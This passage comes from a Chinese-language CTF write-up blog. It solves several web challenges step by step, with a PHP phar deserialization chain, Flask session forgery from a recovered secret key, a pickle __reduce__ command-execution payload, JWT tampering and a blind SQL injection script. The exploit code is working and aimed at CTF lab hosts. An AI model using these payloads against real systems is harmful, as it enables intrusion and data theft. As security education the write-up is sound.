  <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">    $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">    <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;open($path . $filename);</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">       <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;filename = $filename;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $size = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    $units = <span class="keyword">array</span>(<span class="string">' B'</span>, <span class="string">' KB'</span>, <span class="string">' MB'</span>, <span class="string">' GB'</span>, <span class="string">' TB'</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $size &gt;= <span class="number">1024</span> &amp;&amp; $i &lt; <span class="number">4</span>; $i++) $size /= <span class="number">1024</span>;</span><br><span class="line">    <span class="keyword">return</span> round($size, <span class="number">2</span>).$units[$i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>delete.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>download.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其实还有register和Login两个文件，不过没有那么重要，主要进入审计的就是这三个文件了，可以看到<code>download.php</code>是存在过滤的，我们不能通过任意文件读取读取到flag.txt，再仔细审计一波class.php，在db类中发现了一个close方法，同样，在file类中也有一个close函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function close() &#123;</span><br><span class="line">    return file_get_contents($this-&gt;filename);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为调用函数显示文件内容的危险操作。那么就意味着我以为将<code>$this-&gt;db</code>写为new  File,进而去调用这个危险函数，下面是我第一次构造的错误poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> $db;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> File;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是第一次并没有得到flag，仔细分析了一下，发现错误原因，仔细看一下<code>User</code>类的<code>__construct</code>方法以及file类的<code>close</code>方法，在close方法中，只是发现了<code>file_get_contents</code>函数的return操作，并没有echo以及var_dump等操作，所以即便文件取出来了，也无法打印出出来，在仔细看一下<code>Filelist</code>类，主要的危险操作就是<code>__call</code>方法以及<code>__destruct</code>方法，__call方法还是比较好审计出问题的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我调用了一个不存在的方法时，那么首先会把这个方法放到<code>funcs</code>数组里，在从<code>files</code>数组中取出元素，利用这个元素去调用<code>funcs</code>中新增的<code>func</code>,那么只要我可以控制$file，就可以调用任意中的任意方法了，例如调用我们想要的<code>File</code>类中的<code>close</code>方法。此时还是没有<code>echo</code>操作，接着审计下我们的<code>__destruct</code>方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">    $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">        $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实就是将函数调用后<code>return</code>的结果打印出来。那么构造就很简单了，只要将我们的file类实例化，并且指定filename为<code>/flag.txt</code>就好了，构造Poc如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $db;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> FileList;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	$file=<span class="keyword">new</span> File;</span><br><span class="line">    	$file-&gt;filename=<span class="string">'/flag.txt'</span>;</span><br><span class="line">    	<span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="number">0</span>);</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>将生成的<code>phar</code>后缀改为git上传，在<code>delete.php</code>访问<code>phar:lihuaiqiu.gif/test.txt</code></p>
<p><img src="https://s2.ax1x.com/2019/07/13/ZhzyO1.png" alt="ZhzyO1.png"></p>
<p>得到flag。</p>
<h3 id="华东南Web4"><a href="#华东南Web4" class="headerlink" title="华东南Web4"></a>华东南Web4</h3><p>这道题比赛的时候还以为是SSRF..还试了很多ssrf的trick,没想到…其实是HCTF的化简版…</p>
<p>读一下app.py…这个应用程序文件比赛的时候都忘读了，源码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/read')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'No Hack'</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">print</span> str(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'no response'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flag')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>:</span><br><span class="line">        <span class="keyword">return</span> open(<span class="string">'/flag.txt'</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Access denied'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

<p>有关键字file和flag的过滤，不能通过file和flag进行传参，但是必须要session的username是fuck才能得到flag。关键代码为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>uuid.getnode()代表是mac地址，以mac地址为种子产生随机数，这样我们如果得到了mac地址就可以在拿到SECRET_KEY了,进而进行session伪造，这里py2和py3的精度是不一样的，要具体看一下代码是Py2还是Py3，linux下mac地址保存于<code>/sys/class/net/eth0/address</code>，可通过读取拿到mac地址。</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzIyFA.png" alt="ZzIyFA.png"></p>
<p>得到SECRET_KEY,伪造session脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">session_serializer</span><span class="params">(secret_key)</span>:</span></span><br><span class="line">    signer_kwargs = dict(</span><br><span class="line">        key_derivation=<span class="string">'hmac'</span>,</span><br><span class="line">        digest_method=sha1</span><br><span class="line">    )</span><br><span class="line">    Serializer = URLSafeTimedSerializer(secret_key, salt=<span class="string">'cookie-session'</span>,</span><br><span class="line">                                  signer_kwargs=signer_kwargs)</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'fuck'</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> Serializer.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    secret_key = <span class="string">'165.691370347'</span></span><br><span class="line">    <span class="keyword">print</span> session_serializer(secret_key)</span><br></pre></td></tr></table></figure>

<p>得到伪造后的session，发送过去</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzI4eg.png" alt="ZzI4eg.png"></p>
<p>成功得到flag。</p>
<h3 id="IKUN"><a href="#IKUN" class="headerlink" title="IKUN"></a>IKUN</h3><p>利用脚本拿到LV6的位置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://web44.buuoj.cn/shop?page="</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">	r=requests.get(url+str(i))</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'lv6.png'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="keyword">print</span> i</span><br></pre></td></tr></table></figure>

<p>通过改前端discount元素买到，发现不是admin进不去。拿到jwt,解密得到secret为1kun,然后把username变成admin，替换jwt，发现给了源码。此时抓包发现我的传参有一个become参数，在源码里全局搜索一下become，发现如下问题：</p>
<p><img src="https://s2.ax1x.com/2019/07/24/eEhQSg.png" alt="eEhQSg.png"></p>
<p>有一个python反序列化的点，通过渲染拿到form.html的become元素的值进行反序列化，但是我们知道在py反序列化时是可以进行代码执行的，不过这道题似乎ban掉了很多命令执行函数，最后可通过command库绕过，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">    	<span class="keyword">return</span> (commands.getoutput,(<span class="string">'ls /'</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure>

<p>发现flag位置在<code>/flag.txt</code>，再cat一下flag.txt即可得到flag。</p>
<p><img src="https://s2.ax1x.com/2019/07/24/eE5rIx.png" alt="eE5rIx.png"></p>
<h3 id="国赛Easyweb"><a href="#国赛Easyweb" class="headerlink" title="国赛Easyweb"></a>国赛Easyweb</h3><p>国决的一道题，当时给了源码，所以做的还是蛮快的，现在思考一下这道题的正确做法，代码大概看一遍，问题还在image.php，问题代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) ? $_GET[<span class="string">"id"</span>] : <span class="string">"1"</span>;</span><br><span class="line">$path = <span class="keyword">isset</span>($_GET[<span class="string">"path"</span>]) ? $_GET[<span class="string">"path"</span>] : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id = addslashes($id);</span><br><span class="line">$path = addslashes($path);</span><br><span class="line"></span><br><span class="line">$id = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $id);</span><br><span class="line">$path = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $path);</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/load/i"</span>, $sql)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = mysqli_query($con, $sql);</span><br><span class="line">$row = mysqli_fetch_array($result, MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="comment">//secure the path</span></span><br><span class="line">$count = preg_match(<span class="string">"/(\.\.)|(config)/i"</span>, $row[<span class="string">"path"</span>]);</span><br><span class="line"><span class="keyword">if</span> ($count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$path = <span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>大概是能看出来load是被过滤掉了的，防止我们去读取文件，关键的几行代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id = <span class="keyword">isset</span>($_GET[<span class="string">"id"</span>]) ? $_GET[<span class="string">"id"</span>] : <span class="string">"1"</span>;</span><br><span class="line">$path = <span class="keyword">isset</span>($_GET[<span class="string">"path"</span>]) ? $_GET[<span class="string">"path"</span>] : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id = addslashes($id);</span><br><span class="line">$path = addslashes($path);</span><br><span class="line"></span><br><span class="line">$id = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $id);</span><br><span class="line">$path = str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>, <span class="string">"%00"</span>, <span class="string">"\\'"</span>, <span class="string">"'"</span>), <span class="string">""</span>, $path);</span><br><span class="line">$sql = <span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/load/i"</span>, $sql)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"What's your problem?"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先转义后置空？？？本地调一下</p>
<p><img src="https://s2.ax1x.com/2019/09/03/nALeAS.png" alt="nALeAS.png"></p>
<p>如果先转义的话最后留下一个<code>\</code>的话其实就会把后面的<code>&#39;</code>转义掉，最后的形式为</p>
<p>select * from images where id =’xxxx or path’ +注入语句</p>
<p>所以path的地方就是我们要注入的地方了，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">		url=<span class="string">"http://38a73077-7ff7-48a9-9414-0927d78dc473.node1.buuoj.cn/image.php?id=1\\0&amp;path=and%20if(ascii(mid(user(),1,1))=&#123;&#125;,0,1)--+"</span>.format(j)</span><br><span class="line">		r=requests.get(url)</span><br><span class="line">		<span class="keyword">print</span> url</span><br><span class="line">		<span class="keyword">if</span> r.text==<span class="string">""</span>:</span><br><span class="line">			<span class="keyword">print</span> chr(j)</span><br></pre></td></tr></table></figure>

<p>这里就是个大概的验证思路脚本，网速有点慢，就没跑，之后的地方就比较简单的，文件名短标签getshell。</p>
<h3 id="FBCTF-products-manager"><a href="#FBCTF-products-manager" class="headerlink" title="FBCTF-products manager"></a>FBCTF-products manager</h3><p>首先给了源码，大概也看了一遍，一共三个功能。</p>
<ul>
<li>添加产品信息</li>
<li>通过给出的名字以及密码查看特定的产品信息</li>
<li>查看前五个产品的名字</li>
</ul>
<p>大概审计了一遍代码，发现注入过程用的都用了预处理，很难直接去注入，但是看到insert和后面的select】的联动就想起了Mysql约束攻击，当时手滑…谷歌的记录输入，直接在登陆时候输入的是facebook+n个空格+1了….，没注意到，还以为输入的是facebook，后来才发现这个问题，还是先看看你漏洞代码吧</p>
